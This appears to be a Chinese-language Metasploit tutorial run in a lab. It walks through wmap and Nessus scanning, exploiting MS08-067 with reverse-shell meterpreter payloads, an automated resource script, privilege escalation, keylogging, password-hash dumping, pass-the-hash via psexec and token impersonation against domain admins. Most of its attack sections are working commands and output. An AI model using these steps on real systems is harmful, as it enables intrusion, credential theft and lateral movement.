[*] Module auxiliary/scanner/http/backup_file
[*] Module auxiliary/scanner/http/brute_dirs
[*] Module auxiliary/scanner/http/copy_of_file
[*] Module auxiliary/scanner/http/dir_listing
[*] Module auxiliary/scanner/http/dir_scanner
[*] Module auxiliary/scanner/http/dir_webdav_unicode_bypass
[*] Module auxiliary/scanner/http/file_same_name_dir
[*] Module auxiliary/scanner/http/files_dir
[*] Module auxiliary/scanner/http/http_put
[*] Module auxiliary/scanner/http/ms09_020_webdav_unicode_bypass
[*] Module auxiliary/scanner/http/prev_dir_same_name_file
[*] Module auxiliary/scanner/http/replace_ext
[*] Module auxiliary/scanner/http/soap_xml
[*] Module auxiliary/scanner/http/trace_axd
[*] Module auxiliary/scanner/http/verb_auth_bypass
[*] 
=[ Unique Query testing ]=
============================================================
[*] Module auxiliary/scanner/http/blind_sql_query
[*] Module auxiliary/scanner/http/error_sql_injection
```

**0x10运行wmap攻击**

```javascript
msf > wmap_run -e
[*] Using ALL wmap enabled modules.
[-] NO WMAP NODES DEFINED. Executing local modules
[*] Testing target:
[*] 	Site: 10.10.10.129 (10.10.10.129)
[*] 	Port: 80 SSL: false
============================================================
[*] Testing started. 2016-02-16 03:32:39 -0500
[*] 
=[ SSL testing ]=
============================================================
[*] Target is not SSL. SSL modules disabled.
[*] 
=[ Web Server testing ]=
============================================================
[*] Module auxiliary/scanner/http/http_version

[*] 10.10.10.129:80 Apache/2.2.14 (Ubuntu) mod_mono/2.4.3 PHP/5.3.2-1ubuntu4.5 with Suhosin-Patch mod_python/3.3.1 Python/2.6.5 mod_perl/2.0.4 Perl/v5.10.1
[*] Module auxiliary/scanner/http/open_proxy
[*] Module auxiliary/admin/http/tomcat_administration
[*] Module auxiliary/admin/http/tomcat_utf8_traversal
[*] Attempting to connect to 10.10.10.129:80
[+] No File(s) found
[*] Module auxiliary/scanner/http/drupal_views_user_enum
[-] 10.10.10.129 does not appear to be vulnerable, will not continue
[*] Module auxiliary/scanner/http/frontpage_login
[*] http://10.10.10.129/ may not support FrontPage Server Extensions
[*] Module auxiliary/scanner/http/host_header_injection
[*] Module auxiliary/scanner/http/options
[*] 10.10.10.129 allows GET,HEAD,POST,OPTIONS,TRACE methods
[*] 10.10.10.129:80 - TRACE method allowed.
[*] Module auxiliary/scanner/http/robots_txt
[*] [10.10.10.129] /robots.txt found
[*] Module auxiliary/scanner/http/scraper
...
```


**0x11查看扫描结果**

```javascript
msf > wmap_vulns -l
[*] + [10.10.10.129] (10.10.10.129): scraper /
[*] 	scraper Scraper
[*] 	GET Free CSS template by ChocoTemplates.com
[*] + [10.10.10.129] (10.10.10.129): file /.svn/entries
[*] 	file SVN Entry found.
[*] 	GET Res code: 403
[*] + [10.10.10.129] (10.10.10.129): directory /op/
[*] 	directory Directory found.
[*] 	GET Res code: 200
[*] + [10.10.10.129] (10.10.10.129): directory /ops/
[*] 	directory Directory found.
...
```


### Nessus

**0x01安装Nessus：**
```javascript
root@kali:~/Desktop# dpkg -i Nessus-6.10.1-debian6_amd64.deb 
Selecting previously unselected package nessus.
(Reading database ... 309899 files and directories currently installed.)
Preparing to unpack Nessus-6.10.1-debian6_amd64.deb ...
Unpacking nessus (6.10.1) ...
Setting up nessus (6.10.1) ...
Unpacking Nessus Core Components...
nessusd (Nessus) 6.10.1 [build M20082] for Linux
Copyright (C) 1998 - 2016 Tenable Network Security, Inc

Processing the Nessus plugins...
[##################################################]

All plugins loaded (1sec)

 - You can start Nessus by typing /etc/init.d/nessusd start
 - Then go to https://kali:8834/ to configure your scanner

Processing triggers for systemd (228-4) ...
```


## Attack

### attack windows_ms08_067

**0x01 使用nmap的扫描脚本检查漏洞**

ms08_067是一个对操作系统版本以来成都非常高地漏洞，所以为了确保目标版本触发正确地溢出代码，使用nmap收集信息。
```javascript
msf exploit(ms08_067_netapi) > nmap -sT -A --script=smb-vuln-ms08-067.nse -P0 10.10.10.130
[*] exec: nmap -sT -A --script=smb-vuln-ms08-067.nse -P0 10.10.10.130


Starting Nmap 7.01 ( https://nmap.org ) at 2016-02-25 03:38 EST
Nmap scan report for service.dvssc.com (10.10.10.130)
Host is up (0.00091s latency).
Not shown: 985 closed ports
PORT     STATE SERVICE         VERSION
21/tcp   open  ftp             Microsoft ftpd
80/tcp   open  http            Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
135/tcp  open  msrpc           Microsoft Windows RPC
139/tcp  open  netbios-ssn     Microsoft Windows 98 netbios-ssn
445/tcp  open  microsoft-ds    Microsoft Windows 2003 or 2008 microsoft-ds
777/tcp  open  multiling-http?
1025/tcp open  msrpc           Microsoft Windows RPC
1026/tcp open  msrpc           Microsoft Windows RPC
1027/tcp open  msrpc           Microsoft Windows RPC
1031/tcp open  msrpc           Microsoft Windows RPC
1521/tcp open  oracle-tns      Oracle TNS Listener 10.2.0.1.0 (for 32-bit Windows)
6002/tcp open  http            SafeNet Sentinel Protection Server httpd 7.3
|_http-server-header: SentinelProtectionServer/7.3
7001/tcp open  afs3-callback?
7002/tcp open  http            SafeNet Sentinel Keys License Monitor httpd 1.0 (Java Console)
|_http-server-header: SentinelKeysServer/1.0
8099/tcp open  http            Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port777-TCP:V=7.01%I=7%D=2/25%Time=58B142B7%P=x86_64-pc-linux-gnu%r(Ker
SF:beros,5,"\x01\0\t\xe0\x06")%r(SMBProgNeg,5,"\x01\0\t\xe0\x06")%r(Termin
SF:alServer,A,"\x01\0\t\xe0\x06\x01\0\t\xe0\x06")%r(WMSRequest,5,"\x01\0\t
SF:\xe0\x06");
MAC Address: 00:0C:29:9D:6E:8D (VMware)
Device type: general purpose
Running: Microsoft Windows XP|2003
OS CPE: cpe:/o:microsoft:windows_xp::sp2:professional cpe:/o:microsoft:windows_server_2003
OS details: Microsoft Windows XP Professional SP2 or Windows Server 2003
Network Distance: 1 hop
Service Info: OSs: Windows, Windows 98; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_98, cpe:/o:microsoft:windows_server_2003

Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, 
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary 
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx

TRACEROUTE
HOP RTT     ADDRESS
1   0.91 ms service.dvssc.com (10.10.10.130)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 140.40 seconds
```


> 在msf中调用nmap的插件`--script=smb-vuln-ms08-067.nse`进行漏扫，`-sT`是指隐秘的TCP连接扫描（实践中，使用该参数进行端口枚举是最可靠。其他推荐的参数还有`-sS`，隐秘的TCP Syn扫描），`-A`是指高级操作系统探测功能，它会对一个特定服务进行更深入的flag和指纹获取，提供更多的信息。
>  
>  攻击成功与否决定于目标系统的OS版本、安装的服务包(Service Pack)版本以及语言类型，同时还依赖于是否成功地绕过了数据执行保护(DEP:Data Execution Prevention，DEP是为了防止缓冲区溢出攻击而设计地，它将程序堆栈渲染为只读，以防止shellcode被恶意放置在堆栈区并执行。绕过DEP保护可查阅http://www.uninformed.org/?v=2&a=4)

**0x02设置攻击参数**
根据nmap收集的参数，选择了ms08_067的exploits，然后设置必要的参数。

```javascript
msf > search ms08_067_netapi

Matching Modules
================

   Name                                 Disclosure Date  Rank   Description
   ----                                 ---------------  ----   -----------
   exploit/windows/smb/ms08_067_netapi  2008-10-28       great  MS08-067 Microsoft Server Service Relative Path Stack Corruption

msf exploit(ms08_067_netapi) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(ms08_067_netapi) > set RHOST 10.10.10.130
RHOST => 10.10.10.130
msf exploit(ms08_067_netapi) > set LHOST 10.10.10.134
RHOST => 10.10.10.134
msf exploit(ms08_067_netapi) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic Targeting
   1   Windows 2000 Universal
   2   Windows XP SP0/SP1 Universal
   3   Windows 2003 SP0 Universal
   4   Windows XP SP2 English (AlwaysOn NX)
   5   Windows XP SP2 English (NX)
  ...
msf exploit(ms08_067_netapi) > set target 3
target => 3
msf exploit(ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    10.10.10.130     yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.10.134     yes       The listen address
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   3   Windows 2003 SP0 Universal
```


> 在msf框架中查找MS08_067 NETAPI攻击模块，然后使用use命令使用该模块。接下来，设置攻击载荷为基于Windows系统的`Meterpreter reverse_tcp`(该载荷攻击之后，会从目标主机发起一个反向连接。此连接可以绕过防火墙的入站流量保护，或者穿透NAT网关)
> `Windows XP SP2 English (NX)`的NX(No Execute)表示“不允许执行”，即启用了DEP保护。在Win XP SP2中的DEP默认启用（仅对Windows自身服务程序）
> 设置LPORT参数时候，尽量使用防火墙一般会允许通行的常用端口号。本例作为演示，就不另外设置

**0x03发动攻击**

配置好参数，就尝试进行攻击。

```javascript


msf exploit(ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.10.134:4444 
[*] Attempting to trigger the vulnerability...
[*] Sending stage (957487 bytes) to 10.10.10.130
[*] Meterpreter session 1 opened (10.10.10.134:4444 -> 10.10.10.130:2074) at 2016-02-25 03:42:19 -0500
meterpreter > 
```


> 攻击成功之后，返回一个`reverse_tcp`方式的Meterpreter攻击载荷会话。

```javascript


meterpreter > background 
[*] Backgrounding session 1...
msf exploit(ms08_067_netapi) > sessions -l -v

Active sessions
===============

  Session ID: 1
        Type: meterpreter x86/win32
        Info: NT AUTHORITY\SYSTEM @ ROOT-TVI862UBEH
      Tunnel: 10.10.10.134:4444 -> 10.10.10.130:2074 (10.10.10.130)
         Via: exploit/windows/smb/ms08_067_netapi
        UUID: 69572570cc867f74/x86=1/windows=1/-02-25T08:42:17Z
   MachineID: b6c81f0615bb5433af90fb7a5f47f6c8
     CheckIn: 0s ago @ 2016-02-25 04:50:12 -0500
  Registered: No

msf exploit(ms08_067_netapi) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > 
```


> meterpreter的`background`参数可以让当前的载荷会话隐藏在后台，`sessions -l -v`可以查看会话详细的信息。`session -i 1`可以选中ID为1的控制台会话进行交互。输入`shell`之后，可以进入目标系统的命令交互shell中。

![交互shell](/img/hack/Metasploit/1488016580635.png)


### 全端口攻击载荷，暴力猜解目标开放的端口

若攻击的目标有非常严格的出站端口过滤，只允许防火墙开放个别特定的端口，其他端口一律关闭，很难判定哪些端口连接到外部机器上。这时候可以通过MSF对应的攻击载荷进行尝试，直到发现其中一个是放行的，进行端口连接成功为止。

**0x01 选择ms_08_067模块**

**0x02 选择`windows/meterpreter/reverse_tcp_allports`**

```javascript


msf exploit(ms08_067_netapi) > set payload windows/meterpreter/reverse_tcp_allports 
payload => windows/meterpreter/reverse_tcp_allports

```


设置target
```javascript


msf exploit(ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    10.10.10.130     yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp_allports):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.10.134     yes       The listen address
   LPORT     1                yes       The starting port number to connect back on


Exploit target:

   Id  Name
   --  ----
   3   Windows 2003 SP0 Universal
```


**0x03 攻击**

```javascript

msf exploit(ms08_067_netapi) > exploit

[*] Started reverse TCP handler on 10.10.10.134:1 
[*] Attempting to trigger the vulnerability...
[*] Sending stage (957487 bytes) to 10.10.10.130
[*] Meterpreter session 3 opened 

meterpreter > shell
Process 5060 created.
Channel 1 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.
C:\WINDOWS\system32>whoami
whoami
nt authority\system
```


### 资源文件 

资源文件是MSF终端包含一系列自动化命令的脚本文件，这些文件实际上是一个可以在MSF终端运行的命令列表，列表中的命令将顺序执行。
![Alt text](/img/hack/Metasploit/1488517649976.png)


在`/usr/share/metasploit-framework/scripts/resource`路径下创建资源文件`auto_msf_08.rc `,
```javascript


root@kali:/usr/share/metasploit-framework/scripts/resource# echo use exploit/windows/smb/ms08_067_netapi> autoexploit.rc
root@kali:/usr/share/metasploit-framework/scripts/resource# echo set RHOST 10.10.10.130 >>autoexploit.rc 
root@kali:/usr/share/metasploit-framework/scripts/resource# echo set payload windows/meterpreter/reverse_tcp_allports >> autoexploit.rc 
root@kali:/usr/share/metasploit-framework/scripts/resource# echo set LHOST 10.10.10.134 >> autoexploit.rc 
root@kali:/usr/share/metasploit-framework/scripts/resource# echo set target 3 >> autoexploit.rc 
root@kali:/usr/share/metasploit-framework/scripts/resource# echo exploit >> autoexploit.rc 
root@kali:/usr/share/metasploit-framework/scripts/resource# cat autoexploit.rc 

```

msf中加载资源文件实现自动化攻击：
```javascript


msf > resource auto_msf_08.rc 
[*] Processing /usr/share/metasploit-framework/scripts/resource/auto_msf_08.rc for ERB directives.
resource (/usr/share/metasploit-framework/scripts/resource/auto_msf_08.rc)> use exploit/windows/smb/ms08_067_netapi
resource (/usr/share/metasploit-framework/scripts/resource/auto_msf_08.rc)> set RHOST 10.10.10.130
RHOST => 10.10.10.130
resource (/usr/share/metasploit-framework/scripts/resource/auto_msf_08.rc)> set payload windows/meterpreter/reverse_tcp_allports
payload => windows/meterpreter/reverse_tcp_allports
resource (/usr/share/metasploit-framework/scripts/resource/auto_msf_08.rc)> set LHOST 10.10.10.134
LHOST => 10.10.10.134
resource (/usr/share/metasploit-framework/scripts/resource/auto_msf_08.rc)> set target 3
target => 3
resource (/usr/share/metasploit-framework/scripts/resource/auto_msf_08.rc)> exploit

[*] Started reverse TCP handler on 10.10.10.134:1 
[*] Attempting to trigger the vulnerability...
[*] Sending stage (957487 bytes) to 10.10.10.130
[*] Meterpreter session 4 opened (10.10.10.134:1 -> 10.10.10.130:2977) at 2016-03-03 00:17:53 -0500

meterpreter > 
```


## Meterpreter

Meterpreter是Metasploit框架的一个扩展模块，可以调用Metasploit一些功能，对目标系统进行更为深入的渗透，这些功能包括反追踪、纯内存工作模式、密码哈希值获取、特权提升、跳板攻击等等。

在攻击返回meterpreter会话之后，使用meterpreter模块的命令。

### **`getsystem`命令，通过各种向量攻击提升权限**

```javascript
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```


**`screenshot`命令刻意获取活动用户的桌面截屏并保存到对应路径**，可以通过桌面快捷方式判断目标系统安装的软件。

![Alt text](/img/hack/Metasploit/1488783462949.png)

### **`sysinfo`，可以获取系统运行的平台**

```javascript

meterpreter > sysinfo
Computer        : ROOT-TVI862UBEH
OS              : Windows .NET Server (Build 3790).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/win32
```


### **获取键盘记录**。

获得系统的密码，可以使用破解或攻击的方法，也可以在远程的主机上进行键盘记录。

* 先使用`ps`命令来获得目标系统正在进行的进程。
* 使用`migrate`命令将会话迁移到exploreer.exe进程中
* 启动`keylog_recoder`模块。
* 一段时间后，使用`Ctrl-C`终止。最后在另外一个终端，可以看到使用键盘记录所捕捉到的内容。

```javascript


meterpreter > migrate 2136
[*] Migrating from 1020 to 2136...
[*] Migration completed successfully.
meterpreter > run post/windows/capture/keylog_recorder 

[*] Executing module against ROOT-TVI862UBEH
[*] Starting the keystroke sniffer...
[*] Keystrokes being saved in to /root/.msf8/loot/20160306021734_default_10.10.10.130_host.windows.key_149067.txt
[*] Recording keystrokes...
^C[*] Saving last few keystrokes...
[*] Interrupt 
[*] Stopping keystroke sniffer...
meterpreter > 
```

![Alt text](/img/hack/Metasploit/1488784837662.png)

### **挖掘用户名和密码**

#### **0x01提取密码哈希值**。

通过使用Meterpreter中的`hashdump`模块提取系统的用户和密码哈希值。微软Windows系统存储哈希值的方式一般为LM、NTLM、或NTLMv2.

获取安全账号管理器(SAM)数据库，需要在system权限下，以绕过注册表的限制，获取受保护的存有Windows用户和密码的SAM存储。
![Alt text](/img/hack/Metasploit/1488785106799.png)

> 以add3b435开头的哈希值是一个空的或不存在的哈希值——空字串的占位符。由于密码超过14字节的长度，windows不能将其存储为LM形式，所以存储了aad3b435...的字符串，代表空密码。

#### **0x02传递哈希值**

提取到明文密码，不能将明文密码的时候，可以进行哈希传递技术。使用`use exploit/windows/smb/psexec`进行哈希值传递入侵机器。

```javascript


msf exploit(ms08_067_netapi) > use exploit/windows/smb/psexec
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(psexec) > set RHOST 10.10.10.130
RHOST => 10.10.10.130
msf exploit(psexec) > set LHOST 10.10.10.133
LHOST => 10.10.10.133
msf exploit(psexec) > set SMBPASS f0d412bd764ffe81aad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634
SMBPASS => f0d412bd764ffe81aad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634

msf exploit(psexec) > set SMBUser Administrator
SMBUser => Administrator
msf exploit(psexec) > exploit

[*] Started reverse TCP handler on 10.10.10.133:4444 
[*] Connecting to the server...
[*] Authenticating to 10.10.10.130:445 as user 'Administrator'...
[*] Selecting native target
[*] Uploading payload...
[*] Created \mSgcBSlM.exe...
[+] 10.10.10.130:445 - Service started successfully...

```

> 若成功入侵某大型网络中的一台主机，在多数情况下，这台主机的管理员账号与域中其他大部分系统的应该一样。这样就无须破解密码，就能实现从一个节点到另外一个节点的攻击。
![Alt text](/img/hack/Metasploit/1488787439207.png)

#### **0x03权限提升**

获得目标系统的访问权限，可以通过`net user`创建限制权限的普通用户账户，然后进行提权。

* 输入`use priv`加载priv扩展，以便访问某些特权模块。
* 输入`getsystem`尝试将权限提升到本地系统权限或者管理员权限
* 输入`getuid`命令来检查获取的权限等级。当返回Server username: NT AUTHORITY\SYSTEM就意味着获得管理员权限。

### 令牌假冒

获取目标系统中的Kerberos令牌，将其用于身份认证环节，假冒当初创建这个令牌的用户。令牌假冒是Meterpreter最强大的功能之一。

若对某阻止进行渗透，成功入侵了系统并建立了一个Meterpreter终端，而域管理员用户在13小时内登录过该机器。在该用户登入机器的时候，一个Kerberos令牌将发送到服务器上(进行单点登录)并将在随后的一段时间之内有效。这样就可以使用该活动令牌入侵系统，通过Meterpreter可以假冒成域管理员的角色，而不需要破解他的密码，然后就可以去攻击域管理员，甚至是域控。这可能是获取系统访问最简单的方法。
